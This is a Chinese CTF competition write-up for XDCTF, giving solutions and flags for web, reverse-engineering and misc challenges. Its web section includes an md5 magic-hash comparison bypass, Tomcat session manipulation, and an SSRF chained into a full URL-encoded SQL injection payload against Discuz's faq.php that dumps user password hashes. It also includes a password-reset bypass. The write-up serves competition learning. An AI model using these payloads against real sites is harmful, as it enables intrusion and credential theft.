##XDCTF

###web1-100
	反混淆
```php
$test=$_GET['test']; $test=md5($test); if($test=='0') { print "flag{xxxxxx}"; } else print "you are falied!"; print $test; 
```


	md5('240610708') 's result is 0e462097431906509019562988736854.

	md5('QNKCDZO') 's result is 0e830400451993494058024219903391

	flag:XDCTF{XTchInaIqLRWlJF0RI59aoVr5atctVCT}


###web1-200
	
	tomcat，session
	
	http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample
	给自己添加个login=true,user=Administrator
	XDCTF{2b5b7133402ecb87e07e85bf1327bd13}

###web1-300

	.user.ini找到wwwroot目录
	link参数可SSRF
	GET /index.php?link=file:///home/wwwroot/133.130.90.188/index.php
	查hosts发现		9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com
	扫端口发现这个站在3389
	十个discuz，read有个.user.ini，看看这个有没有
	link=http://9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com:3389/.user.ini
	在这里： open_basedir=/home/wwwroot/dz72:/tmp/:/proc/
	直接打exp

	http://133.130.90.188/?link=http://9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com:3389/faq.php?action%3Dgrouppermission%26gids%5B99%5D%3D%2527%26gids%5B100%5D%5B0%5D%3D%2529%2520and%2520%2528select%25201%2520from%2520%2528select%2520count%2528*%2529%2Cconcat%2528%2528select%2520concat%25280x5E5E5E%2Cusername%2C0x3a%2Cpassword%2C0x3a%2Csalt%2529%2520from%2520cdb_uc_members%2520limit%25200%2C1%2529%2Cfloor%2528rand%25280%2529*2%2529%2C0x5E%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2523

	admin:XDCTF{bf127a6ae4e2_ssrf_to_sqli}:99bc3c1

###web2

	发现.git存在，不过都是delete file
	到1.0里面对着hash把文件拖回来
	就可以代码审计了。。。

###web2-100
	问题在Auth.php  public function handle_resetpwd()
	注册->申请改密码->改密码的链接抓包->email=xdsec-cms@xdctf.com&verify[]=fb02d3d0965f0d24b90409dba97e0cb2->登录即可
	Congratulation, this is the [XDSEC-CMS] flag 2

	XDCTF-{i32mX4WK1gwEE9S9Oxd2}

	hint:
	admin url is /th3r315adm1n.php

###web2-200
	
	这个在index.php里
	XDCTF-{raGWvWahqZjww4RdHN90}

###re-100

	这题首先有个反调试 我是直接暴力nop掉了
	然后看算法 跑动态的时候发现ida里面那一长串AAAAAAAAAAAAAAAB的地方其实只是i % 12
	接下来本来应该就简单了 写个解密的算法跑一遍
	结果出来这么个东西：R UbXfPbt7jb
	ida动态调一遍发现还有一个长得类似的函数 异或的部分少异或一个7
	然后改改代码 跑出来：U'Re_AwEs0Me
	这次明显对了 结合XDCTF{input}和提示的全小写
	得到flag：XDCTF{u're_awes0me}

###re-200

	有一段SMC 强行dump掉
	接下来单步看全是明文比对 没有什么难度 中间有段时间检测改跳即可
	得到flag：XDCTF{Congra_tUlat$eyOu}

###re-300
	
	下下来看到一段超长的python一句话
	十分痛心地干了半个晚上

	import string
	import sys
	import functools
	from collections import defaultdict
	
	table = string.printable.strip()
	
	
	def getbit(p, pos):
	    cpos = pos / 8
	    bpos = pos % 8
	    return p[cpos] >> bpos & 1
	
	
	def setbit(p, pos, value):
	    cpos = pos / 8
	    bpos = pos % 8
	    p[cpos] |= value << bpos
	
	
	def encrypt():
	    fin = open("flag.txt", 'r')
	    origin = fin.read().strip()
	    data = []
	    for i in origin:
	        data.append(table.index(i)+1)
	    print(data)
	    buf = list(map(lambda x: 0, data))  # same length buf
	    _len = len(data) * 6
	    for i in xrange(_len):
	        j = i / 6 * 8+i % 6
	        setbit(buf, i, getbit(data, j))
	    print(buf)
	
	
	def decrypt():
	    f = open("flag.enc", 'rb')
	    data = f.read()
	    data = [ord(x) for x in data]
	    _len = len(data) * 6
	    buf = list(map(lambda x: 0, data))  # same length buf
	    used = [False for i in xrange(_len/6*8)]
	    for i in xrange(_len):
	        j = i / 6 * 8 + i % 6
	        bit = getbit(data, i)
	        setbit(buf, j, bit)
	        used[j] = True
	    unused = []
	    for n, i in enumerate(used):
	        if not i:
	            unused.append(n)
	    print ''.join([table[i-1] for i in buf])
	    for i in unused:
	        if i <= 38:
	            continue
	        try:
	            new_buf = buf[:]
	            setbit(new_buf, i, 1)
	            print ''.join([table[m-1] for m in new_buf]), i, 1
	        except IndexError:
	            pass
	
	    # setbit(buf, 29, 0)
	
	
	if __name__ == '__main__':
	    decrypt()

	然后把输出的比对+脑洞猜出来大概是one-lined python is awesome
	得到flag：xdctf{0ne-l1n3d_Py7h0n_1s_@wes0me233}

###misc-100
	
	根据主办方的提示 用braintools
	bftools decode braincopter <filename>这条命令解出来一段brainfuck
	扔到网上跑出来flag：XDCTF{ji910-dad9jq0-iopuno}

###misc-200

	先修复zip
	得到一个含有一个不加密的readme的zip
	然后用Plain-text Attack
	这里直接用Advanced Archive Password Recovery就行
	拿到flag：XDCTF{biiubiiiiiiiiiiiiiiiu&ddddyu}